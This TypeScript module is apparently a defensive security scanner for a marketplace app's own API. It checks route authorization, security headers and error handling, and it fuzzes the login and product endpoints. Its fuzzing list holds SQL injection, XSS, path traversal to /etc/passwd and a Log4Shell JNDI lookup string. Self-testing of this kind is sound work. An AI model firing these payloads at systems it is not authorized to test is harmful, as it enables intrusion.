export type SecurityCheckStatus = "pass" | "warn" | "fail";

export type SecurityCheckCategory =
  | "auth"
  | "authorization"
  | "headers"
  | "api-public"
  | "api-private"
  | "api-admin"
  | "input-validation"
  | "error-handling"
  | "monitoring"
  | "exposure";

export type SecurityCheckResult = {
  id: string;
  title: string;
  status: SecurityCheckStatus;
  category: SecurityCheckCategory;
  details: string;
  howToFix: string;
  technicalEvidence: string;
};

type SecurityProbeExpectation =
  | "no-5xx"
  | "auth-blocked"
  | "admin-blocked"
  | "admin-accessible"
  | "method-should-not-succeed"
  | "reject-or-block";

type SecurityProbeCredentialMode = "anonymous" | "session" | "admin";

type SecurityProbeDefinition = {
  id: string;
  title: string;
  category: SecurityCheckCategory;
  path: string;
  method: "GET" | "HEAD" | "OPTIONS" | "POST" | "PUT" | "PATCH" | "DELETE";
  credentialMode: SecurityProbeCredentialMode;
  expectation: SecurityProbeExpectation;
  body?: unknown;
};

type SecurityProbeResult = {
  status: SecurityCheckStatus;
  details: string;
  howToFix: string;
};

type RunComprehensiveSecurityScanOptions = {
  buildApiUrl: (path: string) => string;
  adminToken: string;
  onProgress?: (done: number, total: number) => void;
};

const REQUEST_TIMEOUT_MS = 9000;
const SCAN_CONCURRENCY = 14;

const READ_METHODS: Array<SecurityProbeDefinition["method"]> = ["GET", "HEAD", "OPTIONS"];
const WRITE_METHODS: Array<SecurityProbeDefinition["method"]> = [
  "POST",
  "PUT",
  "PATCH",
  "DELETE",
];

const PUBLIC_READ_ROUTES = [
  { id: "health", title: "Stato API", path: "/api/health" },
  { id: "products-list", title: "Elenco pubblico dei prodotti", path: "/api/products" },
  { id: "product-detail", title: "Dettaglio pubblico del prodotto", path: "/api/products/1" },
  { id: "product-comments", title: "Commenti pubblici del prodotto", path: "/api/products/1/comments" },
  { id: "vendors-list", title: "Elenco pubblico dei venditori", path: "/api/vendors" },
  { id: "vendor-products", title: "Prodotti pubblici per venditore", path: "/api/vendors/1/products" },
  { id: "public-user", title: "Profilo pubblico del venditore", path: "/api/users/1" },
  { id: "map-tiles", title: "Riquadri pubblici della mappa", path: "/api/map-tiles/13/2413/3074.png" },
  { id: "agent-status", title: "Stato pubblico dell’agente", path: "/api/agent/status/templesale" },
  { id: "agent-script", title: "Script pubblico dell’agente", path: "/api/agent/script/templesale.js" },
  { id: "health-query", title: "Stato API con parametri", path: "/api/health?probe=1" },
  { id: "products-query", title: "Prodotti con parametri pubblici", path: "/api/products?limit=5" },
] as const;

const PUBLIC_MUTATION_ROUTES = [
  { id: "products", title: "Modifica non autorizzata dei prodotti", path: "/api/products" },
  { id: "product-detail", title: "Modifica non autorizzata del dettaglio prodotto", path: "/api/products/1" },
  { id: "product-comments", title: "Modifica non autorizzata dei commenti pubblici", path: "/api/products/1/comments" },
  { id: "vendors", title: "Modifica non autorizzata dei venditori pubblici", path: "/api/vendors" },
  { id: "vendor-products", title: "Modifica non autorizzata dei prodotti del venditore", path: "/api/vendors/1/products" },
  { id: "public-user", title: "Modifica non autorizzata dell’utente pubblico", path: "/api/users/1" },
  { id: "map-tiles", title: "Modifica non autorizzata dei riquadri della mappa", path: "/api/map-tiles/13/2413/3074.png" },
  { id: "health", title: "Modifica non autorizzata dello stato API", path: "/api/health" },
  { id: "agent-status", title: "Modifica non autorizzata dello stato agente", path: "/api/agent/status/templesale" },
  { id: "agent-script", title: "Modifica non autorizzata dello script agente", path: "/api/agent/script/templesale.js" },
] as const;

const AUTH_READ_ROUTES = [
  { id: "auth-me", title: "Sessione dell’utente autenticato", path: "/api/auth/me" },
  { id: "profile-defaults", title: "Valori predefiniti del modulo annuncio", path: "/api/profile/new-product-defaults" },
  { id: "my-products", title: "I miei prodotti", path: "/api/my-products" },
  { id: "likes", title: "Prodotti che mi piacciono", path: "/api/likes" },
  { id: "notifications", title: "Notifiche dell’utente", path: "/api/notifications" },
  { id: "my-products-query", title: "I miei prodotti con parametri", path: "/api/my-products?limit=5" },
] as const;

const AUTH_MUTATION_ROUTES = [
  { id: "profile", title: "Aggiornamento del profilo", path: "/api/profile" },
  { id: "profile-avatar", title: "Aggiornamento dell’avatar", path: "/api/profile/avatar" },
  { id: "profile-defaults", title: "Aggiornamento dei valori predefiniti dell’annuncio", path: "/api/profile/new-product-defaults" },
  { id: "auth-logout", title: "Disconnessione autenticata", path: "/api/auth/logout" },
  { id: "products-create", title: "Creazione prodotto autenticata", path: "/api/products" },
  { id: "product-update", title: "Modifica prodotto autenticata", path: "/api/products/1" },
  { id: "product-comments", title: "Creazione commento autenticata", path: "/api/products/1/comments" },
  { id: "product-cart-interest", title: "Interesse nel carrello autenticato", path: "/api/products/1/cart-interest" },
  { id: "product-like", title: "Mi piace autenticato", path: "/api/products/1/like" },
  { id: "product-delete", title: "Eliminazione prodotto autenticata", path: "/api/products/1" },
  { id: "product-unlike", title: "Rimozione Mi piace autenticata", path: "/api/products/1/like?mode=delete" },
] as const;

const ADMIN_READ_ROUTES = [
  { id: "admin-auth-me", title: "Sessione amministrativa", path: "/api/admin/auth/me" },
  { id: "admin-me", title: "Sessione amministratore precedente", path: "/api/admin/me" },
  { id: "admin-root", title: "Sessione amministratore principale", path: "/api/admin" },
  { id: "admin-users", title: "Elenco amministrativo degli utenti", path: "/api/admin/users" },
  { id: "admin-user-products", title: "Prodotti per utente nell’amministrazione", path: "/api/admin/users/1/products" },
  { id: "admin-events-a", title: "Eventi di sicurezza (percorso A)", path: "/api/admin/security-test/events?limit=1" },
  { id: "admin-events-b", title: "Eventi di sicurezza (percorso B)", path: "/api/admin/security-tests/events?limit=1" },
  { id: "admin-agent-status", title: "Stato agente nell’amministrazione", path: "/api/admin/agent/status/templesale" },
  { id: "admin-auth-alt", title: "Sessione amministratore alternativa", path: "/api/admin/auth" },
  { id: "admin-auth-alt-query", title: "Sessione amministratore con parametri", path: "/api/admin/auth?probe=1" },
] as const;

const ADMIN_MUTATION_ROUTES = [
  { id: "admin-users-delete", title: "Eliminazione utente nell’amministrazione", path: "/api/admin/users/1" },
  { id: "admin-products-delete", title: "Eliminazione prodotto nell’amministrazione", path: "/api/admin/products/1" },
  { id: "admin-events-clear-a", title: "Pulizia eventi (percorso A)", path: "/api/admin/security-test/events" },
  { id: "admin-events-clear-b", title: "Pulizia eventi (percorso B)", path: "/api/admin/security-tests/events" },
  { id: "admin-agent-status-patch", title: "Modifica dello stato agente nell’amministrazione", path: "/api/admin/agent/status/templesale" },
  { id: "admin-auth-logout-a", title: "Disconnessione amministratore auth", path: "/api/admin/auth/logout" },
  { id: "admin-auth-logout-b", title: "Disconnessione amministratore precedente", path: "/api/admin/logout" },
  { id: "admin-auth-delete", title: "Disconnessione amministratore con DELETE auth", path: "/api/admin/auth" },
  { id: "admin-root-delete", title: "Disconnessione amministratore con DELETE principale", path: "/api/admin" },
] as const;

const FUZZING_FRAGMENTS = [
  "' OR 1=1 --",
  "<script>alert(1)</script>",
  "../../../etc/passwd",
  "${jndi:ldap://malicious.local/a}",
  "%0d%0aSet-Cookie:evil=1",
  "\"; DROP TABLE users; --",
  "{{7*7}}",
  "<img src=x onerror=alert(1)>",
  "A".repeat(2048),
  "🧨".repeat(180),
  "\\x00\\x1f\\x7f",
  "' UNION SELECT NULL --",
  "<svg/onload=alert(1)>",
  "%3Cscript%3Ealert(1)%3C/script%3E",
  "\" OR \"1\"=\"1",
  "{\"$gt\":\"\"}",
];

function normalizePreview(text: string): string {
  return text.replace(/\s+/g, " ").trim().slice(0, 220);
}

function getCategoryLabel(category: SecurityCheckCategory): string {
  switch (category) {
    case "auth":
      return "Autenticação";
    case "authorization":
      return "Autorização";
    case "headers":
      return "Cabeçalhos";
    case "api-public":
      return "API pública";
    case "api-private":
      return "API autenticada";
    case "api-admin":
      return "API administrativa";
    case "input-validation":
      return "Validação de entrada";
    case "error-handling":
      return "Tratamento de erro";
    case "monitoring":
      return "Monitoramento";
    case "exposure":
      return "Exposição";
    default:
      return "Segurança";
  }
}

function defaultFixForExpectation(expectation: SecurityProbeExpectation, path: string): string {
  switch (expectation) {
    case "auth-blocked":
      return `Exija login obrigatório na rota ${path}, valide sessão/token e retorne 401/403 para qualquer acesso sem credencial válida.`;
    case "admin-blocked":
      return `Restrinja ${path} para perfil de administrador, valide token admin e negue qualquer usuário comum com 403.`;
    case "admin-accessible":
      return `Garanta que o admin autenticado tenha acesso estável a ${path}. Revise cookie de sessão, token e middlewares de autorização.`;
    case "method-should-not-succeed":
      return `Bloqueie métodos indevidos em ${path} (ideal: 405/403/401) e nunca permita mutação com request anônima.`;
    case "reject-or-block":
      return `Fortaleça validação de entrada em ${path}, sanitize payload e responda 4xx para dados inválidos ou maliciosos, nunca 5xx.`;
    case "no-5xx":
      return `Evite erro 5xx em ${path} com validação defensiva, tratamento de exceções e respostas controladas para erro de cliente.`;
    default:
      return `Revise a política de segurança da rota ${path} e aplique controle explícito por método, autenticação e tratamento de erro.`;
  }
}

function evaluateProbeResult(
  expectation: SecurityProbeExpectation,
  statusCode: number,
  path: string,
): SecurityProbeResult {
  const isClientError = statusCode >= 400 && statusCode < 500;
  const isServerError = statusCode >= 500;
  const isBlocked = statusCode === 401 || statusCode === 403;
  const isMethodRestricted = [400, 401, 403, 404, 405, 415, 422].includes(statusCode);

  switch (expectation) {
    case "no-5xx":
      if (statusCode >= 200 && statusCode < 400) {
        return {
          status: "pass",
          details: `A rota respondeu de forma estável (${statusCode}) sem erro de servidor.`,
          howToFix: "Nenhuma ação crítica agora. Continue monitorando para manter estabilidade em produção.",
        };
      }
      if (isClientError) {
        return {
          status: "warn",
          details: `A rota respondeu ${statusCode}. Não houve 5xx, mas há comportamento de bloqueio/validação que merece revisão.`,
          howToFix: defaultFixForExpectation(expectation, path),
        };
      }
      return {
        status: "fail",
        details: `A rota retornou ${statusCode} com erro interno do servidor (5xx).`,
        howToFix: defaultFixForExpectation(expectation, path),
      };

    case "auth-blocked":
      if (isBlocked) {
        return {
          status: "pass",
          details: `Sem login, a rota bloqueou corretamente (${statusCode}).`,
          howToFix: "Proteção correta para acesso anônimo. Mantenha a regra de autorização ativa.",
        };
      }
      if (statusCode === 404 || statusCode === 405) {
        return {
          status: "warn",
          details: `A rota respondeu ${statusCode}. Não abriu acesso, mas a proteção não foi explicitamente 401/403.`,
          howToFix: defaultFixForExpectation(expectation, path),
        };
      }
      return {
        status: "fail",
        details: `Sem login, a rota respondeu ${statusCode} e não bloqueou como esperado.`,
        howToFix: defaultFixForExpectation(expectation, path),
      };

    case "admin-blocked":
      if (isBlocked) {
        return {
          status: "pass",
          details: `Acesso sem admin foi bloqueado corretamente (${statusCode}).`,
          howToFix: "Proteção administrativa está correta para requisições sem privilégio.",
        };
      }
      if (statusCode === 404 || statusCode === 405) {
        return {
          status: "warn",
          details: `A rota respondeu ${statusCode}. A superfície não abriu, mas falta retorno explícito de autorização (401/403).`,
          howToFix: defaultFixForExpectation(expectation, path),
        };
      }
      return {
        status: "fail",
        details: `A rota admin respondeu ${statusCode} sem bloquear acesso indevido.`,
        howToFix: defaultFixForExpectation(expectation, path),
      };

    case "admin-accessible":
      if (statusCode >= 200 && statusCode < 400) {
        return {
          status: "pass",
          details: `Com sessão admin, a rota respondeu normalmente (${statusCode}).`,
          howToFix: "Sem correção urgente. Apenas manter monitoramento de disponibilidade da rota administrativa.",
        };
      }
      if (isBlocked) {
        return {
          status: "fail",
          details: `Mesmo com sessão/admin token, a rota respondeu ${statusCode}.`,
          howToFix: defaultFixForExpectation(expectation, path),
        };
      }
      if (isClientError) {
        return {
          status: "warn",
          details: `Com sessão admin, a rota respondeu ${statusCode}. Pode haver validação extra ou incompatibilidade de contrato.`,
          howToFix: defaultFixForExpectation(expectation, path),
        };
      }
      return {
        status: "fail",
        details: `Com sessão admin, a rota retornou ${statusCode} (erro interno).`,
        howToFix: defaultFixForExpectation(expectation, path),
      };

    case "method-should-not-succeed":
      if (isMethodRestricted) {
        return {
          status: "pass",
          details: `Método indevido foi bloqueado/rejeitado com ${statusCode}.`,
          howToFix: "Comportamento esperado. Preserve bloqueio por método HTTP nessa rota.",
        };
      }
      if (isServerError) {
        return {
          status: "fail",
          details: `Método indevido causou erro interno (${statusCode}).`,
          howToFix: defaultFixForExpectation(expectation, path),
        };
      }
      return {
        status: "fail",
        details: `Método indevido respondeu ${statusCode} e pode estar permitindo comportamento não previsto.`,
        howToFix: defaultFixForExpectation(expectation, path),
      };

    case "reject-or-block":
      if (isBlocked || isClientError) {
        return {
          status: "pass",
          details: `Payload malformado foi bloqueado/rejeitado com ${statusCode}.`,
          howToFix: "Proteção adequada para esse caso de entrada inválida.",
        };
      }
      if (isServerError) {
        return {
          status: "fail",
          details: `Payload malicioso/ruim gerou erro interno (${statusCode}).`,
          howToFix: defaultFixForExpectation(expectation, path),
        };
      }
      return {
        status: "fail",
        details: `Payload malformado respondeu ${statusCode}, sinal de validação insuficiente.`,
        howToFix: defaultFixForExpectation(expectation, path),
      };

    default:
      return {
        status: "warn",
        details: `Resultado não classificado (${statusCode}).`,
        howToFix: defaultFixForExpectation(expectation, path),
      };
  }
}

function buildMethodProbeBody(method: SecurityProbeDefinition["method"], fallbackBody?: unknown): unknown {
  if (fallbackBody !== undefined) {
    return fallbackBody;
  }
  if (method === "POST" || method === "PUT" || method === "PATCH" || method === "DELETE") {
    return {
      probe: "security-scan",
      timestamp: Date.now(),
    };
  }
  return undefined;
}

function buildComprehensiveProbeCatalog(): SecurityProbeDefinition[] {
  const probes: SecurityProbeDefinition[] = [];

  const pushProbe = (
    probe: Omit<SecurityProbeDefinition, "id"> & { idSuffix: string },
  ) => {
    probes.push({
      id: probe.idSuffix,
      title: probe.title,
      category: probe.category,
      path: probe.path,
      method: probe.method,
      credentialMode: probe.credentialMode,
      expectation: probe.expectation,
      body: probe.body,
    });
  };

  for (const route of PUBLIC_READ_ROUTES) {
    for (const method of READ_METHODS) {
      pushProbe({
        idSuffix: `public-anon-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) senza accesso`,
        category: "api-public",
        path: route.path,
        method,
        credentialMode: "anonymous",
        expectation: "no-5xx",
      });
      pushProbe({
        idSuffix: `public-session-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) con sessione`,
        category: "api-public",
        path: route.path,
        method,
        credentialMode: "session",
        expectation: "no-5xx",
      });
    }
  }

  for (const route of PUBLIC_MUTATION_ROUTES) {
    for (const method of WRITE_METHODS) {
      pushProbe({
        idSuffix: `public-mutation-anon-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) senza accesso`,
        category: "authorization",
        path: route.path,
        method,
        credentialMode: "anonymous",
        expectation: "method-should-not-succeed",
      });
    }
  }

  for (const route of AUTH_READ_ROUTES) {
    for (const method of READ_METHODS) {
      pushProbe({
        idSuffix: `auth-read-anon-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) senza accesso`,
        category: "auth",
        path: route.path,
        method,
        credentialMode: "anonymous",
        expectation: "auth-blocked",
      });
      pushProbe({
        idSuffix: `auth-read-session-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) con sessione`,
        category: "api-private",
        path: route.path,
        method,
        credentialMode: "session",
        expectation: "no-5xx",
      });
    }
  }

  for (const route of AUTH_MUTATION_ROUTES) {
    for (const method of WRITE_METHODS) {
      pushProbe({
        idSuffix: `auth-mutation-anon-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) senza accesso`,
        category: "authorization",
        path: route.path,
        method,
        credentialMode: "anonymous",
        expectation: "auth-blocked",
      });
    }
  }

  for (const route of ADMIN_READ_ROUTES) {
    for (const method of READ_METHODS) {
      pushProbe({
        idSuffix: `admin-read-anon-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) senza amministratore`,
        category: "api-admin",
        path: route.path,
        method,
        credentialMode: "anonymous",
        expectation: "admin-blocked",
      });
      pushProbe({
        idSuffix: `admin-read-session-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) con amministratore`,
        category: "api-admin",
        path: route.path,
        method,
        credentialMode: "admin",
        expectation: "admin-accessible",
      });
    }
  }

  for (const route of ADMIN_MUTATION_ROUTES) {
    for (const method of WRITE_METHODS) {
      pushProbe({
        idSuffix: `admin-mutation-anon-${route.id}-${method.toLowerCase()}`,
        title: `${route.title} (${method}) senza amministratore`,
        category: "api-admin",
        path: route.path,
        method,
        credentialMode: "anonymous",
        expectation: "admin-blocked",
      });
    }
  }

  FUZZING_FRAGMENTS.forEach((fragment, index) => {
    const fuzzId = index + 1;
    const routes: Array<{
      id: string;
      title: string;
      path: string;
      category: SecurityCheckCategory;
      body: Record<string, unknown>;
    }> = [
      {
        id: "auth-login",
        title: "Fuzzing dell’accesso utente",
        path: "/api/auth/login",
        category: "input-validation",
        body: {
          email: `invalid-login-${fuzzId}-${fragment}`,
          password: `x-${fragment}`,
        },
      },
      {
        id: "auth-register",
        title: "Fuzzing della registrazione utente",
        path: "/api/auth/register",
        category: "input-validation",
        body: {
          name: `scanner-${fuzzId}`,
          email: `invalid-register-${fuzzId}-${fragment}`,
          password: "1",
        },
      },
      {
        id: "admin-login",
        title: "Fuzzing dell’accesso amministratore",
        path: "/api/admin/login",
        category: "api-admin",
        body: {
          email: `invalid-admin-${fuzzId}-${fragment}`,
          password: `x-${fragment}`,
        },
      },
      {
        id: "admin-auth-login",
        title: "Fuzzing dell’accesso amministratore alternativo",
        path: "/api/admin/auth/login",
        category: "api-admin",
        body: {
          login: `invalid-admin-alt-${fuzzId}-${fragment}`,
          password: `x-${fragment}`,
        },
      },
      {
        id: "product-create",
        title: "Fuzzing della creazione prodotto senza accesso",
        path: "/api/products",
        category: "authorization",
        body: {
          name: `probe-${fuzzId}`,
          category: "Outros",
          price: fragment,
          quantity: 1,
          description: "payload de varredura",
          latitude: 0,
          longitude: 0,
        },
      },
      {
        id: "product-comment",
        title: "Fuzzing dei commenti senza accesso",
        path: "/api/products/1/comments",
        category: "authorization",
        body: {
          body: fragment,
          rating: 5,
        },
      },
    ];

    for (const route of routes) {
      pushProbe({
        idSuffix: `fuzz-${route.id}-${fuzzId}`,
        title: `${route.title} (payload ${fuzzId})`,
        category: route.category,
        path: route.path,
        method: "POST",
        credentialMode: "anonymous",
        expectation: "reject-or-block",
        body: route.body,
      });
    }
  });

  return probes;
}

function buildHeaderCheck(
  id: string,
  title: string,
  status: SecurityCheckStatus,
  details: string,
  howToFix: string,
  technicalEvidence: string,
): SecurityCheckResult {
  return {
    id,
    title,
    status,
    category: "headers",
    details,
    howToFix,
    technicalEvidence,
  };
}

async function runHeaderAndExposureChecks(
  options: Pick<RunComprehensiveSecurityScanOptions, "buildApiUrl" | "adminToken">,
): Promise<SecurityCheckResult[]> {
  const checks: SecurityCheckResult[] = [];

  try {
    const healthResponse = await fetch(options.buildApiUrl("/api/health"), {
      method: "GET",
      credentials: "include",
      headers:
        options.adminToken.trim().length > 0
          ? {
              Authorization: `Bearer ${options.adminToken}`,
              "X-Admin-Token": options.adminToken,
              "X-Admin-Auth": options.adminToken,
            }
          : undefined,
    });

    const healthBody = await healthResponse.text().catch(() => "");
    const h = healthResponse.headers;
    const requiredHeaders = [
      "x-content-type-options",
      "x-frame-options",
      "referrer-policy",
      "content-security-policy",
      "permissions-policy",
      "strict-transport-security",
    ] as const;

    for (const headerName of requiredHeaders) {
      const value = h.get(headerName);
      checks.push(
        buildHeaderCheck(
          `headers-required-${headerName}`,
          `Header obrigatório: ${headerName}`,
          value ? "pass" : "warn",
          value
            ? `Header presente com valor configurado.`
            : `Header ausente na resposta do endpoint /api/health.`,
          value
            ? "Sem ajuste urgente para este header. Apenas manter monitoramento de regressões."
            : `Configure o header ${headerName} no backend/reverse-proxy para endurecer proteção de segurança.`,
          `GET /api/health -> ${healthResponse.status}; ${headerName}=${
            value ? normalizePreview(value) : "<ausente>"
          }`,
        ),
      );
    }

    const csp = h.get("content-security-policy") ?? "";
    checks.push(
      buildHeaderCheck(
        "headers-csp-unsafe-inline",
        "CSP sem unsafe-inline",
        csp.includes("'unsafe-inline'") ? "warn" : "pass",
        csp.includes("'unsafe-inline'")
          ? "A política CSP permite 'unsafe-inline', facilitando XSS se existir injeção em front."
          : "CSP não expõe 'unsafe-inline'.",
        csp.includes("'unsafe-inline'")
          ? "Remova 'unsafe-inline' da CSP e migre scripts/estilos para nonce/hash."
          : "Sem ajuste crítico neste ponto.",
        `CSP atual: ${normalizePreview(csp) || "<vazio>"}`,
      ),
    );

    checks.push(
      buildHeaderCheck(
        "headers-csp-unsafe-eval",
        "CSP sem unsafe-eval",
        csp.includes("'unsafe-eval'") ? "warn" : "pass",
        csp.includes("'unsafe-eval'")
          ? "A política CSP permite 'unsafe-eval', reduzindo proteção contra execução dinâmica maliciosa."
          : "CSP não expõe 'unsafe-eval'.",
        csp.includes("'unsafe-eval'")
          ? "Remova 'unsafe-eval' e ajuste bibliotecas para não depender de eval/new Function."
          : "Sem ajuste crítico neste ponto.",
        `CSP atual: ${normalizePreview(csp) || "<vazio>"}`,
      ),
    );

    const serverHeader = h.get("server") ?? "";
    const poweredByHeader = h.get("x-powered-by") ?? "";
    const hasDetailedFingerprint =
      poweredByHeader.trim().length > 0 ||
      /express|nginx|apache|vite|node/i.test(serverHeader);
    checks.push({
      id: "exposure-server-fingerprint",
      title: "Esposizione dell’impronta del server",
      status: hasDetailedFingerprint ? "warn" : "pass",
      category: "exposure",
      details: hasDetailedFingerprint
        ? "A resposta expõe assinatura do stack (Server/X-Powered-By), útil para fingerprinting de atacante."
        : "Não foi detectada exposição direta de fingerprint de stack em headers comuns.",
      howToFix: hasDetailedFingerprint
        ? "Remova X-Powered-By e minimize detalhes do header Server no proxy/web server."
        : "Sem correção crítica agora. Mantenha hardening de headers de borda.",
      technicalEvidence: `server=${normalizePreview(serverHeader) || "<ausente>"}; x-powered-by=${
        normalizePreview(poweredByHeader) || "<ausente>"
      }`,
    });

    const lowerBody = healthBody.toLowerCase();
    const exposureKeywords = ["password", "secret", "token", "apikey", "database_url", "private_key"];
    const leakedKeyword = exposureKeywords.find((keyword) => lowerBody.includes(keyword));
    checks.push({
      id: "exposure-sensitive-health-body",
      title: "Esposizione di segreti nella risposta pubblica",
      status: leakedKeyword ? "fail" : "pass",
      category: "exposure",
      details: leakedKeyword
        ? `A resposta pública contém potencial dado sensível (palavra-chave: ${leakedKeyword}).`
        : "Não foi detectado segredo explícito no corpo de /api/health.",
      howToFix: leakedKeyword
        ? "Remova qualquer segredo de respostas públicas e use logs internos para diagnóstico sensível."
        : "Sem ajuste crítico neste ponto.",
      technicalEvidence: `GET /api/health body-preview=${normalizePreview(healthBody) || "<vazio>"}`,
    });
  } catch (error) {
    const message = error instanceof Error ? error.message : "erro ao validar headers/exposição";
    checks.push({
      id: "headers-health-unreachable",
      title: "Verifica degli header e dell’esposizione",
      status: "fail",
      category: "headers",
      details: `Não foi possível validar os headers de segurança porque /api/health falhou: ${message}`,
      howToFix: "Garanta disponibilidade do endpoint de health e políticas de headers no reverse-proxy.",
      technicalEvidence: `Erro ao acessar /api/health: ${message}`,
    });
  }

  try {
    const unknownRouteResponse = await fetch(options.buildApiUrl("/api/__security_scan_unknown_route__"), {
      method: "GET",
      credentials: "omit",
    });
    const body = await unknownRouteResponse.text().catch(() => "");
    const lowerBody = body.toLowerCase();
    const leaksStack = lowerBody.includes("stack") || lowerBody.includes("trace") || lowerBody.includes("exception");
    checks.push({
      id: "error-handling-unknown-route",
      title: "Gestione degli errori per un percorso inesistente",
      status:
        unknownRouteResponse.status === 404
          ? leaksStack
            ? "warn"
            : "pass"
          : unknownRouteResponse.status >= 500
            ? "fail"
            : "warn",
      category: "error-handling",
      details:
        unknownRouteResponse.status === 404
          ? leaksStack
            ? "Rota inexistente retorna 404, mas corpo indica possível vazamento de detalhes internos."
            : "Rota inexistente retorna 404 sem evidência de vazamento interno."
          : `Rota inexistente respondeu ${unknownRouteResponse.status}, fora do padrão esperado 404.`,
      howToFix:
        unknownRouteResponse.status === 404 && !leaksStack
          ? "Sem ajuste crítico agora. Mantenha resposta 404 limpa e padronizada."
          : "Padronize fallback de rota inexistente para 404 e nunca exponha stack trace em resposta pública.",
      technicalEvidence: `GET /api/__security_scan_unknown_route__ -> ${unknownRouteResponse.status}; body=${normalizePreview(
        body,
      )}`,
    });
  } catch (error) {
    const message = error instanceof Error ? error.message : "erro desconhecido";
    checks.push({
      id: "error-handling-unknown-route",
      title: "Gestione degli errori per un percorso inesistente",
      status: "fail",
      category: "error-handling",
      details: `Falha ao testar comportamento de rota inexistente: ${message}`,
      howToFix: "Garanta fallback global para 404 com resposta controlada e sem stack trace.",
      technicalEvidence: `Erro no teste de rota inexistente: ${message}`,
    });
  }

  try {
    const anonMonitor = await fetch(options.buildApiUrl("/api/admin/security-test/events?limit=1"), {
      method: "GET",
      credentials: "omit",
    });
    checks.push({
      id: "monitoring-admin-events-protection",
      title: "Protezione del monitor di sicurezza (accesso anonimo)",
      status: anonMonitor.status === 401 || anonMonitor.status === 403 ? "pass" : "fail",
      category: "monitoring",
      details:
        anonMonitor.status === 401 || anonMonitor.status === 403
          ? "Monitor de eventos administrativos está protegido contra acesso anônimo."
          : `Monitor de eventos respondeu ${anonMonitor.status} sem bloqueio explícito para anônimo.`,
      howToFix:
        anonMonitor.status === 401 || anonMonitor.status === 403
          ? "Sem ajuste crítico agora."
          : "Bloqueie monitor administrativo para anônimos com middleware de autorização admin (401/403).",
      technicalEvidence: `GET /api/admin/security-test/events?limit=1 (anon) -> ${anonMonitor.status}`,
    });
  } catch (error) {
    const message = error instanceof Error ? error.message : "erro desconhecido";
    checks.push({
      id: "monitoring-admin-events-protection",
      title: "Protezione del monitor di sicurezza (accesso anonimo)",
      status: "fail",
      category: "monitoring",
      details: `Falha ao testar proteção do monitor de eventos: ${message}`,
      howToFix: "Valide disponibilidade da rota e middleware de autorização admin.",
      technicalEvidence: `Erro em /api/admin/security-test/events: ${message}`,
    });
  }

  return checks;
}

async function executeSecurityProbe(
  probe: SecurityProbeDefinition,
  options: Pick<RunComprehensiveSecurityScanOptions, "buildApiUrl" | "adminToken">,
): Promise<SecurityCheckResult> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);

  try {
    const headers = new Headers();
    const body = buildMethodProbeBody(probe.method, probe.body);
    if (body !== undefined) {
      headers.set("Content-Type", "application/json");
    }

    if (probe.credentialMode === "admin" && options.adminToken) {
      headers.set("Authorization", `Bearer ${options.adminToken}`);
      headers.set("X-Admin-Token", options.adminToken);
      headers.set("X-Admin-Auth", options.adminToken);
    }

    const response = await fetch(options.buildApiUrl(probe.path), {
      method: probe.method,
      credentials: probe.credentialMode === "anonymous" ? "omit" : "include",
      headers,
      signal: controller.signal,
      body:
        body === undefined || probe.method === "GET" || probe.method === "HEAD" || probe.method === "OPTIONS"
          ? undefined
          : JSON.stringify(body),
    });

    const rawBody = await response.text().catch(() => "");
    const technicalEvidence = `${probe.method} ${probe.path} -> ${response.status}${
      rawBody ? ` | body: ${normalizePreview(rawBody)}` : ""
    }`;
    const evaluated = evaluateProbeResult(probe.expectation, response.status, probe.path);

    return {
      id: probe.id,
      title: probe.title,
      status: evaluated.status,
      category: probe.category,
      details: evaluated.details,
      howToFix: evaluated.howToFix,
      technicalEvidence,
    };
  } catch (error) {
    const message = error instanceof Error ? error.message : "Erro desconhecido na varredura.";
    return {
      id: probe.id,
      title: probe.title,
      status: "fail",
      category: probe.category,
      details: `Falha técnica ao executar a verificação: ${message}`,
      howToFix: defaultFixForExpectation(probe.expectation, probe.path),
      technicalEvidence: `${probe.method} ${probe.path} -> erro de execução: ${message}`,
    };
  } finally {
    clearTimeout(timeout);
  }
}

export function getSecurityCategoryLabel(category: SecurityCheckCategory): string {
  return getCategoryLabel(category);
}

export async function runComprehensiveSecurityScan(
  options: RunComprehensiveSecurityScanOptions,
): Promise<{
  checks: SecurityCheckResult[];
  totalProbes: number;
}> {
  const probes = buildComprehensiveProbeCatalog();
  const checks: SecurityCheckResult[] = new Array(probes.length);
  let nextIndex = 0;
  let done = 0;

  const workerCount = Math.min(SCAN_CONCURRENCY, probes.length);
  const workers = Array.from({ length: workerCount }, async () => {
    while (true) {
      const currentIndex = nextIndex;
      nextIndex += 1;
      if (currentIndex >= probes.length) {
        return;
      }

      checks[currentIndex] = await executeSecurityProbe(probes[currentIndex], options);
      done += 1;
      options.onProgress?.(done, probes.length);
    }
  });

  await Promise.all(workers);

  const extraChecks = await runHeaderAndExposureChecks(options);
  const orderedChecks = checks
    .filter((item): item is SecurityCheckResult => Boolean(item))
    .concat(extraChecks);
  orderedChecks.sort((left, right) => {
    const statusWeight = (status: SecurityCheckStatus): number => {
      if (status === "fail") {
        return 0;
      }
      if (status === "warn") {
        return 1;
      }
      return 2;
    };

    const statusDelta = statusWeight(left.status) - statusWeight(right.status);
    if (statusDelta !== 0) {
      return statusDelta;
    }
    return left.title.localeCompare(right.title, "pt-BR");
  });

  return {
    checks: orderedChecks,
    totalProbes: probes.length + extraChecks.length,
  };
}
